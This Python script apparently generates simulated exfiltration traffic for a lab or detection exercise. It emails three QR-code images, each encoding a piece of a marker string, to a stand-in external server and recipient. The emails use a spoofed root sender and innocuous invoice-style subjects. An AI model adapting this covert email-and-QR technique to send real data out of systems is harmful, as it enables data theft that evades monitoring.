#!/usr/bin/env python3
"""
SMTP exfiltration sender.
Sends three emails with QR code PNG attachments via SMTP to the specified server.
The QR codes contain the three pieces of the SMTP marker.
"""
import argparse
import io
import os
import smtplib
import sys
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.encoders import encode_base64
from pathlib import Path

try:
    import qrcode
except ImportError:
    print("[-] qrcode not installed. Run: pip install qrcode pillow", file=sys.stderr)
    sys.exit(1)


def make_qr_png(data: str) -> bytes:
    """Generate a QR code PNG in memory and return the bytes."""
    img = qrcode.make(data)
    buf = io.BytesIO()
    img.save(buf, format="PNG")
    return buf.getvalue()


def build_email(subject: str, recipient: str, qr_data: str, filename: str) -> str:
    """Build a MIME email with a QR PNG attachment."""
    msg = MIMEMultipart()
    msg["Subject"] = subject
    msg["From"] = "root@prod-web-03"
    msg["To"] = recipient

    body = MIMEText(f"Please find the attached {subject.lower()} document.\n", "plain")
    msg.attach(body)

    png_bytes = make_qr_png(qr_data)
    attachment = MIMEBase("image", "png", filename=filename)
    attachment.set_payload(png_bytes)
    encode_base64(attachment)
    attachment.add_header("Content-Disposition", f"attachment; filename={filename}")
    msg.attach(attachment)

    return msg.as_string()


def main():
    parser = argparse.ArgumentParser(description="SMTP QR exfiltration sender")
    parser.add_argument("--smtp-host", default="203.0.113.25", help="SMTP server IP")
    parser.add_argument("--smtp-port", type=int, default=25, help="SMTP server port")
    parser.add_argument("--recipient", default="finance.archive@external.example", help="Recipient email")
    args = parser.parse_args()

    emails = [
        ("Monthly reconciliation", "IMG_1841.png", "Hnc"),
        ("Updated invoice summary", "IMG_1842.png", "fuEY"),
        ("Quarterly documentation", "IMG_1843.png", "92kL"),
    ]

    print(f"[*] Connecting to SMTP server {args.smtp_host}:{args.smtp_port}")

    try:
        with smtplib.SMTP(args.smtp_host, args.smtp_port, timeout=30) as s:
            s.set_debuglevel(1)
            for subject, filename, qr_data in emails:
                print(f"[*] Sending: {subject} ({filename})")
                email_body = build_email(subject, args.recipient, qr_data, filename)
                s.sendmail("root@prod-web-03", [args.recipient], email_body)
                print(f"[+] Sent: {subject}")
    except Exception as e:
        print(f"[-] SMTP error: {e}", file=sys.stderr)
        sys.exit(1)

    print("[+] SMTP exfiltration complete")


if __name__ == "__main__":
    main()